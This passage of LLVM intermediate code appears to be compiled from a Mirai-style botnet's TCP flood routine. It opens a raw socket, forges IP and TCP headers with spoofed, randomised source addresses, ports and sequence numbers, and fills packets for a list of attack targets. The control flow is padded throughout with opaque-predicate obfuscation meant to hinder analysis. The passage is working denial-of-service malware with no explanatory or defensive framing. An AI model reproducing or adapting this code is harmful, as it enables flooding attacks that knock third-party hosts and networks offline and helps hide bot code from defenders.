  store i8 %61, i8* %23, align 1
  %62 = load i8, i8* %15, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 6, i32 65535)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %24, align 2
  %66 = load i8, i8* %15, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 7, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %25, align 2
  %70 = load i8, i8* %15, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 17, i32 65535)
  store i32 %72, i32* %26, align 4
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 18, i32 0)
  store i32 %75, i32* %27, align 4
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 11, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %28, align 1
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 12, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %29, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 13, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %30, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 14, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %31, align 1
  %92 = load i8, i8* %15, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 15, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %32, align 1
  %96 = load i8, i8* %15, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 16, i32 0)
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %33, align 1
  %100 = load i8, i8* %15, align 1
  %101 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %102 = load i32, i32* @LOCAL_ADDR, align 4
  %103 = call i32 @attack_get_opt_ip(i8 zeroext %100, %struct.attack_option* %101, i8 zeroext 25, i32 %102)
  store i32 %103, i32* %34, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %18, align 4
  %105 = icmp eq i32 %104, -1
  %106 = load i32, i32* @x.19
  %107 = load i32, i32* @y.20
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %105, label %114, label %115

; <label>:114:                                    ; preds = %originalBBpart2
  br label %629

; <label>:115:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %116 = load i32, i32* %18, align 4
  %117 = bitcast i32* %17 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #6
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %120, label %123

; <label>:120:                                    ; preds = %115
  %121 = load i32, i32* %18, align 4
  %122 = call i32 @close(i32 %121)
  br label %629

; <label>:123:                                    ; preds = %115
  store i32 0, i32* %17, align 4
  br label %124

; <label>:124:                                    ; preds = %originalBBpart24, %123
  %125 = load i32, i32* %17, align 4
  %126 = load i8, i8* %13, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp slt i32 %125, %127
  br i1 %128, label %129, label %320

; <label>:129:                                    ; preds = %124
  %130 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %131 = load i8**, i8*** %19, align 8
  %132 = load i32, i32* %17, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  store i8* %130, i8** %134, align 8
  %135 = load i8**, i8*** %19, align 8
  %136 = load i32, i32* %17, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  store %struct.iphdr* %140, %struct.iphdr** %35, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i64 1
  %143 = bitcast %struct.iphdr* %142 to %struct.tcphdr*
  store %struct.tcphdr* %143, %struct.tcphdr** %36, align 8
  %144 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i64 1
  %146 = bitcast %struct.tcphdr* %145 to i8*
  store i8* %146, i8** %37, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, 15
  %151 = or i8 %150, 64
  store i8 %151, i8* %148, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, -16
  %156 = or i8 %155, 5
  store i8 %156, i8* %153, align 4
  %157 = load i8, i8* %20, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 1
  store i8 %157, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 60) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %21, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %22, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %23, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %129
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %129
  %177 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 6, i8* %178, align 1
  %179 = load i32, i32* %34, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %183 = load i32, i32* %17, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i32 %187, i32* %189, align 4
  %190 = load i16, i16* %24, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load i16, i16* %25, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* %26, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = zext i16 %200 to i32
  %202 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 2
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -241
  %208 = or i16 %207, 160
  store i16 %208, i16* %205, align 4
  %209 = load i8, i8* %28, align 1
  %210 = sext i8 %209 to i16
  %211 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %210, 1
  %215 = shl i16 %214, 13
  %216 = and i16 %213, -8193
  %217 = or i16 %216, %215
  store i16 %217, i16* %212, align 4
  %218 = load i8, i8* %29, align 1
  %219 = sext i8 %218 to i16
  %220 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %219, 1
  %224 = shl i16 %223, 12
  %225 = and i16 %222, -4097
  %226 = or i16 %225, %224
  store i16 %226, i16* %221, align 4
  %227 = load i8, i8* %30, align 1
  %228 = sext i8 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = and i16 %228, 1
  %233 = shl i16 %232, 11
  %234 = and i16 %231, -2049
  %235 = or i16 %234, %233
  store i16 %235, i16* %230, align 4
  %236 = load i8, i8* %31, align 1
  %237 = sext i8 %236 to i16
  %238 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = and i16 %237, 1
  %242 = shl i16 %241, 10
  %243 = and i16 %240, -1025
  %244 = or i16 %243, %242
  store i16 %244, i16* %239, align 4
  %245 = load i8, i8* %32, align 1
  %246 = sext i8 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = and i16 %246, 1
  %251 = shl i16 %250, 9
  %252 = and i16 %249, -513
  %253 = or i16 %252, %251
  store i16 %253, i16* %248, align 4
  %254 = load i8, i8* %33, align 1
  %255 = sext i8 %254 to i16
  %256 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %255, 1
  %260 = shl i16 %259, 8
  %261 = and i16 %258, -257
  %262 = or i16 %261, %260
  store i16 %262, i16* %257, align 4
  %263 = load i8*, i8** %37, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %37, align 8
  store i8 2, i8* %263, align 1
  %265 = load i8*, i8** %37, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %37, align 8
  store i8 6, i8* %265, align 1
  %267 = call i32 @rand_next()
  %268 = and i32 %267, 15
  %269 = add i32 1458, %268
  %270 = trunc i32 %269 to i16
  %271 = call zeroext i16 @htons(i16 zeroext %270) #7
  %272 = load i8*, i8** %37, align 8
  %273 = bitcast i8* %272 to i16*
  store i16 %271, i16* %273, align 2
  %274 = load i8*, i8** %37, align 8
  %275 = getelementptr inbounds i8, i8* %274, i64 2
  store i8* %275, i8** %37, align 8
  %276 = load i8*, i8** %37, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %37, align 8
  store i8 4, i8* %276, align 1
  %278 = load i8*, i8** %37, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %37, align 8
  store i8 2, i8* %278, align 1
  %280 = load i8*, i8** %37, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %37, align 8
  store i8 8, i8* %280, align 1
  %282 = load i8*, i8** %37, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %37, align 8
  store i8 10, i8* %282, align 1
  %284 = call i32 @rand_next()
  %285 = load i8*, i8** %37, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 %284, i32* %286, align 4
  %287 = load i8*, i8** %37, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %37, align 8
  %289 = load i8*, i8** %37, align 8
  %290 = bitcast i8* %289 to i32*
  store i32 0, i32* %290, align 4
  %291 = load i8*, i8** %37, align 8
  %292 = getelementptr inbounds i8, i8* %291, i64 4
  store i8* %292, i8** %37, align 8
  %293 = load i8*, i8** %37, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %37, align 8
  store i8 1, i8* %293, align 1
  %295 = load i8*, i8** %37, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %37, align 8
  store i8 3, i8* %295, align 1
  %297 = load i8*, i8** %37, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %37, align 8
  store i8 3, i8* %297, align 1
  %299 = load i8*, i8** %37, align 8
  %300 = getelementptr inbounds i8, i8* %299, i32 1
  store i8* %300, i8** %37, align 8
  store i8 8, i8* %299, align 1
  br label %301

; <label>:301:                                    ; preds = %176
  %302 = load i32, i32* @x.19
  %303 = load i32, i32* @y.20
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %301
  %310 = load i32, i32* %17, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %17, align 4
  %312 = load i32, i32* @x.19
  %313 = load i32, i32* @y.20
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %124

; <label>:320:                                    ; preds = %124
  br label %321

; <label>:321:                                    ; preds = %628, %320
  %322 = load i32, i32* @x.19
  %323 = load i32, i32* @y.20
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %321
  store i32 0, i32* %17, align 4
  %330 = load i32, i32* @x.19
  %331 = load i32, i32* @y.20
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %338

; <label>:338:                                    ; preds = %625, %originalBBpart28
  %339 = load i32, i32* @x.19
  %340 = load i32, i32* @y.20
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %338
  %347 = load i32, i32* %17, align 4
  %348 = load i8, i8* %13, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp slt i32 %347, %349
  %351 = load i32, i32* @x.19
  %352 = load i32, i32* @y.20
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %350, label %359, label %628

; <label>:359:                                    ; preds = %originalBBpart212
  %360 = load i8**, i8*** %19, align 8
  %361 = load i32, i32* %17, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds i8*, i8** %360, i64 %362
  %364 = load i8*, i8** %363, align 8
  store i8* %364, i8** %38, align 8
  %365 = load i8*, i8** %38, align 8
  %366 = bitcast i8* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %39, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i64 1
  %369 = bitcast %struct.iphdr* %368 to %struct.tcphdr*
  store %struct.tcphdr* %369, %struct.tcphdr** %40, align 8
  %370 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %371 = load i32, i32* %17, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 2
  %375 = load i8, i8* %374, align 4
  %376 = zext i8 %375 to i32
  %377 = icmp slt i32 %376, 32
  br i1 %377, label %378, label %399

; <label>:378:                                    ; preds = %359
  %379 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %380 = load i32, i32* %17, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 1
  %384 = load i32, i32* %383, align 4
  %385 = call i32 @ntohl(i32 %384) #7
  %386 = call i32 @rand_next()
  %387 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %388 = load i32, i32* %17, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 2
  %392 = load i8, i8* %391, align 4
  %393 = zext i8 %392 to i32
  %394 = lshr i32 %386, %393
  %395 = add i32 %385, %394
  %396 = call i32 @htonl(i32 %395) #7
  %397 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 9
  store i32 %396, i32* %398, align 4
  br label %399

; <label>:399:                                    ; preds = %378, %359
  %400 = load i32, i32* %34, align 4
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %402, label %406

; <label>:402:                                    ; preds = %399
  %403 = call i32 @rand_next()
  %404 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 8
  store i32 %403, i32* %405, align 4
  br label %406

; <label>:406:                                    ; preds = %402, %399
  %407 = load i16, i16* %21, align 2
  %408 = zext i16 %407 to i32
  %409 = icmp eq i32 %408, 65535
  br i1 %409, label %410, label %432

; <label>:410:                                    ; preds = %406
  %411 = load i32, i32* @x.19
  %412 = load i32, i32* @y.20
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %410
  %419 = call i32 @rand_next()
  %420 = and i32 %419, 65535
  %421 = trunc i32 %420 to i16
  %422 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 3
  store i16 %421, i16* %423, align 4
  %424 = load i32, i32* @x.19
  %425 = load i32, i32* @y.20
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart231, label %originalBB14alteredBB

originalBBpart231:                                ; preds = %originalBB14
  br label %432

; <label>:432:                                    ; preds = %originalBBpart231, %406
  %433 = load i32, i32* @x.19
  %434 = load i32, i32* @y.20
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %432
  %441 = load i16, i16* %24, align 2
  %442 = zext i16 %441 to i32
  %443 = icmp eq i32 %442, 65535
  %444 = load i32, i32* @x.19
  %445 = load i32, i32* @y.20
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %443, label %452, label %474

; <label>:452:                                    ; preds = %originalBBpart235
  %453 = load i32, i32* @x.19
  %454 = load i32, i32* @y.20
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %452
  %461 = call i32 @rand_next()
  %462 = and i32 %461, 65535
  %463 = trunc i32 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 0
  store i16 %463, i16* %465, align 4
  %466 = load i32, i32* @x.19
  %467 = load i32, i32* @y.20
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart246, label %originalBB37alteredBB

originalBBpart246:                                ; preds = %originalBB37
  br label %474

; <label>:474:                                    ; preds = %originalBBpart246, %originalBBpart235
  %475 = load i32, i32* @x.19
  %476 = load i32, i32* @y.20
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %474
  %483 = load i16, i16* %25, align 2
  %484 = zext i16 %483 to i32
  %485 = icmp eq i32 %484, 65535
  %486 = load i32, i32* @x.19
  %487 = load i32, i32* @y.20
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %485, label %494, label %516

; <label>:494:                                    ; preds = %originalBBpart250
  %495 = load i32, i32* @x.19
  %496 = load i32, i32* @y.20
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %494
  %503 = call i32 @rand_next()
  %504 = and i32 %503, 65535
  %505 = trunc i32 %504 to i16
  %506 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 1
  store i16 %505, i16* %507, align 2
  %508 = load i32, i32* @x.19
  %509 = load i32, i32* @y.20
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart262, label %originalBB52alteredBB

originalBBpart262:                                ; preds = %originalBB52
  br label %516

; <label>:516:                                    ; preds = %originalBBpart262, %originalBBpart250
  %517 = load i32, i32* @x.19
  %518 = load i32, i32* @y.20
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %516
  %525 = load i32, i32* %26, align 4
  %526 = icmp eq i32 %525, 65535
  %527 = load i32, i32* @x.19
  %528 = load i32, i32* @y.20
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %526, label %535, label %539

; <label>:535:                                    ; preds = %originalBBpart266
  %536 = call i32 @rand_next()
  %537 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 2
  store i32 %536, i32* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %535, %originalBBpart266
  %540 = load i32, i32* %27, align 4
  %541 = icmp eq i32 %540, 65535
  br i1 %541, label %542, label %562

; <label>:542:                                    ; preds = %539
  %543 = load i32, i32* @x.19
  %544 = load i32, i32* @y.20
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %542
  %551 = call i32 @rand_next()
  %552 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 3
  store i32 %551, i32* %553, align 4
  %554 = load i32, i32* @x.19
  %555 = load i32, i32* @y.20
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %562

; <label>:562:                                    ; preds = %originalBBpart270, %539
  %563 = load i32, i32* @x.19
  %564 = load i32, i32* @y.20
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %562
  %571 = load i8, i8* %28, align 1
  %572 = icmp ne i8 %571, 0
  %573 = load i32, i32* @x.19
  %574 = load i32, i32* @y.20
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %572, label %581, label %587

; <label>:581:                                    ; preds = %originalBBpart274
  %582 = call i32 @rand_next()
  %583 = and i32 %582, 65535
  %584 = trunc i32 %583 to i16
  %585 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  br label %587

; <label>:587:                                    ; preds = %581, %originalBBpart274
  %588 = load %struct.iphdr*, %struct.iphdr** %39, align 8
